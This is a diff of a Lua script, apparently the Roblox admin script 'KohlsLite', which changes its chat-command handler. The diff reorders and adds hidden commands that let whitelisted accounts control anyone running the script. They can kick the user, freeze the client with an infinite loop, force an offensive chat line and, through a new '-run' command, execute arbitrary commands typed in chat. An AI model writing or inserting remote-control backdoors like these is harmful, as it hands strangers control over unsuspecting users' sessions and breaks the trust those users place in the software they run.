@@ -243,7 +243,7 @@ local nokick = {
     "YT_MATHEUSMODZ5"
 }
 
--- Players with special perms
+-- Players with special perms [collaborators of KL]
 local specialperms = {
     "me_123eq",
     "me_crashking",
@@ -8318,26 +8318,15 @@ v.Chatted:Connect(function(msg)
                                 Speak("I use KohlsLite!")
                 end
 
-
-                if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                                pcall(function()
-                                        game.Players.LocalPlayer:Kick("SkiddyProgrammer {kohlslite owner} kicked you from the game!")
-                                end)
-                end  
-
-                if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                                    Remind("You have been warned by KohlsLite owner!")
-                end
-
-                if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                                     while true do end
-                                -- game:Shutdown()
-                end
-
-                if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+        	if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
                                 Speak("atprog groomed me")
                 end
 
+                if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
+                                pcall(function()
+                                        game.Players.LocalPlayer:Kick("A KohlsLite collaborator kicked you from the game!")
+                                end)
+                end  
 
                 if string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
                                 pcall(function()
@@ -8345,14 +8334,34 @@ v.Chatted:Connect(function(msg)
                                 end)
                 end
 
+                if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
+                                    Remind("You have been warned by a KohlsLite collaborator!")
+                end
+
+
                 if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
                                     Remind("You have been WARNED!")
+                end
+
+                if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
+                                     while true do end
+                                -- game:Shutdown()
                 end
 
                 if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
                                      while true do end
                                 -- game:Shutdown()
                 end
+
+
+           	if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
+        			Execute(string.sub(msg, 6))
+    		end
+
+           	if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+        			Execute(string.sub(msg, 6))
+    		end
+
 
                 end)
 -- ADMIN
